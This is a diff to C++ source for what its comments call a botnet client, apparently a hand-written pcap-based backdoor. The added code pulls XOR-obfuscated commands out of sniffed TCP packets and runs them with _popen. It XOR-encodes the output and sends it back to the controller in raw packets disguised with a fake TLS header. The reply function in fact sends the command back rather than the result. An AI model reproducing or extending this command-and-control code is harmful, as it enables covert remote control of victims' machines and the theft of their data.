@@ -129,7 +129,8 @@ pcap_if_t* capture_em_packets();
 void get_mac(mac_values** values);
 void ipv4_address(std::vector<std::string>& lines_vect, std::vector<std::string>& ip_addresses);
 void get_ip(std::vector<std::string>& ip_addresses);
-int send_packet(std::string address, std::string mac_addr, std::string option);
+int send_packet(std::string address, std::string mac_addr, std::string option, int id_num);
+int connected_mode_send(std::string address, std::string mac_addr, std::string option, std::string command, int id_num);
 
 /*
  *This is the capture thread
@@ -515,11 +516,11 @@ void decapsulate(const u_char *data, int size) {
 			//check total packet length
 			int total_packet_length = ((ih->tlen & 0xFF) << 8) | ((ih->tlen >> 8) & 0xFF); //length of data
 			total_packet_length = total_packet_length - 20 - (ip_header_length * 4);
+
 			//assume there is layer three data
 			if(total_packet_length > 0){
-				std::cout << total_packet_length << std::endl;
-				std::cout << ip_header_length << std::endl;
-				std::cout << "IP Address " << address << std::endl;
+				int identification_number = ((ih->identification & 0xFF) << 8) | ((ih->identification >> 8) & 0xFF);
+
 				//get tcp header
 				head_len = (ih->ver_ihl & 0xf) * 4;//length of ip header
 				th = (tcp_head *)((u_char*)ih + head_len);
@@ -541,13 +542,37 @@ void decapsulate(const u_char *data, int size) {
 							//increment
 							data_char = data_char + 1;
 						}
+						//decrypt command
+						for (int i = 0; i < command.length(); i++) {
+							command[i] = command[i] ^ 'H';
+						}
 						//run command
-						int return_val = system(command.c_str());
+						char buffer[128];
+						FILE* _pipe = _popen(command.c_str(), "r");
+						std::string result = "";
+						//redirects stdout to pipe and adds elements of buffer to result string
+						if (!_pipe) {
+							std::cout << "ERROR" << std::endl;
+						}
+
+						while (!feof(_pipe)) {
+							if (fgets(buffer, 128, _pipe) != NULL)
+								result += buffer;
+						}
+						_pclose(_pipe);
+						//encrypt result
+						for (int i = 0; i < result.length(); i++) {
+							result[i] = result[i] ^ 'H';
+						}
+						//return result to server
+						identification_number++;
+						connected_mode_send(address, mac_address, "1", command, identification_number);
 					}
 				}
 
 			}
 			else {
+				int identification_number = ((ih->identification & 0xFF) << 8) | ((ih->identification >> 8) & 0xFF);
 				//length 6 is reserved for ack packets
 				//on botnet communication to complete handshake
 				if (ip_header_length > 6) {
@@ -560,7 +585,8 @@ void decapsulate(const u_char *data, int size) {
 					//check control bit number for syn packet
 					if ((int)th->flag == 2) {
 						//send syn ack
-						send_packet(address, mac_address, "1");
+						identification_number++;
+						send_packet(address, mac_address, "1", identification_number);
 					}
 
 				}
@@ -732,7 +758,7 @@ void get_ip(std::vector<std::string>& ip_addresses) {
 *Used to send ip packets
 *returns: success of packet being sent
 */
-int send_packet(std::string address, std::string mac_addr, std::string option) {
+int send_packet(std::string address, std::string mac_addr, std::string option, int id_num) {
 	mac_values* values = (mac_values*)malloc((sizeof(int) * 6));
 	mac_values* mac_address = (mac_values*)malloc((sizeof(int) * 6));
 	get_mac(&values);
@@ -790,6 +816,9 @@ int send_packet(std::string address, std::string mac_addr, std::string option) {
 			myfile.close();
 		}
 	}
+	else if (option == "result") {
+
+	}
 	else if (option == "2") {
 		packet[14] = 71;
 		size = 62;
@@ -803,8 +832,8 @@ int send_packet(std::string address, std::string mac_addr, std::string option) {
 						 //differentiated services
 	packet[15] = 0;
 	//total length =1500
-	packet[16] = 5;
-	packet[17] = 220;
+	packet[16] = id_num / 256;
+	packet[17] = id_num % 256;
 	//identification =19142
 	packet[18] = 74;
 	packet[19] = 198;
@@ -860,6 +889,176 @@ int send_packet(std::string address, std::string mac_addr, std::string option) {
 	pcap_t* fp = get_handle(&first_device);
 	if (fp == NULL) {
 		std::cout << "Did not get interface handle" << std::endl;
+		LeaveCriticalSection(&HandleLock);
+		return -1;
+	}
+	if (pcap_sendpacket(fp, packet, size /* size */) != 0)
+	{
+		std::cout << "\nError sending the packet: \n" << pcap_geterr(fp) << std::endl;
+		LeaveCriticalSection(&HandleLock);
+		return -1;
+	}
+	LeaveCriticalSection(&HandleLock);
+
+	return 0;
+}
+
+/*
+*Used to send ip packets
+*returns: success of packet being sent
+*/
+int connected_mode_send(std::string address, std::string mac_addr, std::string option, std::string command, int id_num) {
+	mac_values* values = (mac_values*)malloc((sizeof(int) * 6));
+	mac_values* mac_address = (mac_values*)malloc((sizeof(int) * 6));
+	get_mac(&values);
+	u_char packet[162];
+
+	std::vector<std::string> mac_val;
+	split(mac_addr, ':', mac_val);
+	mac_address->value0 = atoi(mac_val[0].c_str());
+	mac_address->value1 = atoi(mac_val[1].c_str());
+	mac_address->value2 = atoi(mac_val[2].c_str());
+	mac_address->value3 = atoi(mac_val[3].c_str());
+	mac_address->value4 = atoi(mac_val[4].c_str());
+	mac_address->value5 = atoi(mac_val[5].c_str());
+
+	//destination mac address
+	packet[0] = mac_address->value0;
+	packet[1] = mac_address->value1;
+	packet[2] = mac_address->value2;
+	packet[3] = mac_address->value3;
+	packet[4] = mac_address->value4;
+	packet[5] = mac_address->value5;
+	free(mac_address);
+	//source mac address
+	packet[6] = values->value0;
+	packet[7] = values->value1;
+	packet[8] = values->value2;
+	packet[9] = values->value3;
+	packet[10] = values->value4;
+	packet[11] = values->value5;
+	free(values);
+
+	//ethernet type IPv4
+	packet[12] = 8;
+	packet[13] = 0;
+	//version field and IHL
+	int size = 0;
+	if (option == "1") {
+		packet[14] = 69; //64 represents 4=>IPv4  5 represents minimum ipv4 length
+						 //get packet size
+		int com_len = command.length();
+		size = 66 + command.length(); //needs this for sending packet function
+
+		std::cout << "I've sent the packet boss." << std::endl;
+		//sending ack packet
+		std::ifstream myfile("psh_ack_tcp_header.txt");
+		if (myfile.is_open()) {
+			std::string line;
+			getline(myfile, line);
+			std::vector<std::string> bytes;
+			split(line, ' ', bytes);
+			int index = 0;
+			for (int i = 34; i < 53; i++) {
+				packet[i] = atoi(bytes[index].c_str());
+				index++;
+			}
+			myfile.close();
+		}
+		//last byte in urgent pointer
+		packet[53] = 0;
+
+		//set ssl header
+		packet[54] = 23;  //packet type
+						  //version 1.2 => 03 03 is how to set this field
+						  //I Know, I Know, it's dumb.
+		packet[55] = 3;   //major 1
+		packet[56] = 3;   //minor 1
+						  //length
+		packet[57] = 0;   //high
+		packet[58] = 7 + command.length();   //low
+											 //zero padding
+		packet[59] = 0;
+		packet[60] = 0;
+		packet[61] = 0;
+		packet[62] = 0;
+		packet[63] = 0;
+		packet[64] = 0;
+		packet[65] = 0;
+		//data
+		int index = 66; //start index
+		for (int x = 0; x < command.length(); x++) {
+			packet[index] = command[x];
+			index++;
+		}
+
+	}
+	else if (option == "2") {
+		//this will represent something else
+	}
+	else
+		packet[14] = 69; //64 represents 4=>IPv4  5 represents minimum ipv4 length
+
+						 //differentiated services
+	packet[15] = 0;
+	//total length =1500
+	packet[16] = 5;
+	packet[17] = 220;
+	//identification
+	packet[18] = id_num / 256;
+	packet[19] = id_num % 256;
+	//flags don't fragment =010
+	packet[20] = 64;
+	//fragment offset
+	packet[21] = 0;
+	//TTL
+	packet[22] = 255;
+	//layer 4 protocol
+	packet[23] = 6;  //must be set to detect layer 4 protocols
+					 //header checksum
+	packet[24] = 39;
+	packet[25] = 50;
+
+	//getting all ip addresses from ipconfig command
+	std::vector<std::string> ip_addresses;
+	get_ip(ip_addresses);
+	ip_address* src_addr = (ip_address*)malloc((sizeof(int) * 4));
+	ip_address* dest_addr = (ip_address*)malloc((sizeof(int) * 4));
+	//source address
+	std::vector<std::string> octets;
+	split(ip_addresses[0], '.', octets);
+	src_addr->byte1 = atoi(octets[0].c_str());
+	src_addr->byte2 = atoi(octets[1].c_str());
+	src_addr->byte3 = atoi(octets[2].c_str());
+	src_addr->byte4 = atoi(octets[3].c_str());
+
+	//destination address
+	std::vector<std::string> octs;
+	split(address, '.', octs);
+	dest_addr->byte1 = atoi(octs[0].c_str());
+	dest_addr->byte2 = atoi(octs[1].c_str());
+	dest_addr->byte3 = atoi(octs[2].c_str());
+	dest_addr->byte4 = atoi(octs[3].c_str());
+
+	//source ip address
+	packet[26] = src_addr->byte1;
+	packet[27] = src_addr->byte2;
+	packet[28] = src_addr->byte3;
+	packet[29] = src_addr->byte4;
+	free(src_addr);
+	//destination ip address
+	packet[30] = dest_addr->byte1;
+	packet[31] = dest_addr->byte2;
+	packet[32] = dest_addr->byte3;
+	packet[33] = dest_addr->byte4;
+	free(dest_addr);
+
+	std::cout << "made it here" << std::endl;
+	/* Send the packet */
+	EnterCriticalSection(&HandleLock);
+	pcap_if_t* first_device;
+	pcap_t* fp = get_handle(&first_device);
+	if (fp == NULL) {
 		LeaveCriticalSection(&HandleLock);
 		return -1;
 	}
